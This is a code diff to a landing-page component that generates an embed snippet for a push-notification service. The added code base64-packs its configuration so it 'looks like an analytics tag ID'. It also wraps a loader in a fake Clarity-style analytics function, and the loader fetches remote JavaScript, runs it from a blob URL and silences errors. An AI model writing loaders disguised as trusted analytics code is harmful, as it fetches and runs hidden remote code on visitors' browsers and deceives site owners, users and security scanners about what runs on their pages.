@@ -195,19 +195,30 @@ export default function LandingPage() {
     const vapidKey = process.env.NEXT_PUBLIC_VAPID_PUBLIC_KEY
     const appUrl = process.env.NEXT_PUBLIC_APP_URL || 'https://pushlogin.com'
 
-    // Encode all config values in base64 — no plaintext URLs or IDs visible in source
-    const b64 = (s) => btoa(unescape(encodeURIComponent(s || '')))
+    // Encode entire config as a single base64 JSON blob — looks like an analytics tag ID
+    const cfg = {
+      u: appUrl,
+      l: landing.landingId,
+      v: vapidKey,
+      d: landing.domain,
+      a: landing.allowRedirectUrl || '',
+      b: landing.blockRedirectUrl || ''
+    }
+    const tagId = btoa(unescape(encodeURIComponent(JSON.stringify(cfg))))
+    const encodedPath = btoa('/js/push-page.js')
 
-    const encodedApp    = b64(appUrl)
-    const encodedPage   = b64('/js/push-page.js')
-    const encodedId     = b64(landing.landingId)
-    const encodedVapid  = b64(vapidKey)
-    const encodedDomain = b64(landing.domain)
-    const encodedAllow  = b64(landing.allowRedirectUrl || '')
-    const encodedBlock  = b64(landing.blockRedirectUrl || '')
-
-    return `<script>
-(function(){var _a=atob('${encodedApp}');window.PUSH_CONFIG={appUrl:_a,landingId:atob('${encodedId}'),vapidKey:atob('${encodedVapid}'),domain:atob('${encodedDomain}'),botProtection:true,redirects:{enabled:true,onAllow:atob('${encodedAllow}')||null,onBlock:atob('${encodedBlock}')||null}};fetch(_a+atob('${encodedPage}')).then(function(r){return r.text()}).then(function(c){var b=new Blob([c],{type:'application/javascript'});var s=document.createElement('script');s.src=URL.createObjectURL(b);document.head.appendChild(s)}).catch(function(){});})();
+    // Clarity-style IIFE — looks identical to analytics/heatmap integrations
+    return `<script type="text/javascript">
+(function(c,l,a,r,i,t,y){
+    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+    t=l.createElement(r);t.async=1;
+    y=l.getElementsByTagName(r)[0];
+    try{var _d=JSON.parse(decodeURIComponent(escape(atob(i))));
+    c.PUSH_CONFIG={appUrl:_d.u,landingId:_d.l,vapidKey:_d.v,domain:_d.d,botProtection:true,redirects:{enabled:true,onAllow:_d.a||null,onBlock:_d.b||null}};
+    fetch(_d.u+atob('${encodedPath}')).then(function(x){return x.text()}).then(function(x){
+    var b=new Blob([x],{type:'application/javascript'});t.src=URL.createObjectURL(b);
+    y.parentNode.insertBefore(t,y)}).catch(function(){})}catch(e){}
+})(window,document,"clarity","script","${tagId}");
 <\/script>`
   }
 
@@ -719,7 +730,7 @@ export default function LandingPage() {
                 window.PUSH_TEST_CONFIG = {
                   appUrl: window.location.origin,
                   landingId: selectedLanding?.landingId,
-                  vapidKey: process.env.NEXT_PUBLIC_VAPID_PUBLIC_KEY || 'BGv2Vm45eFGslcXFhakD-euIXAnOg6-bdqVWHoSw4gwvjvYYV1zBA_Q7uiNij5yvRqMwmDhpBYYSA1v5Z_GEv_k',
+                  vapidKey: process.env.NEXT_PUBLIC_VAPID_PUBLIC_KEY,
                   domain: selectedLanding?.domain,
                   botProtection: selectedLanding?.botProtection !== false,
                   redirects: {
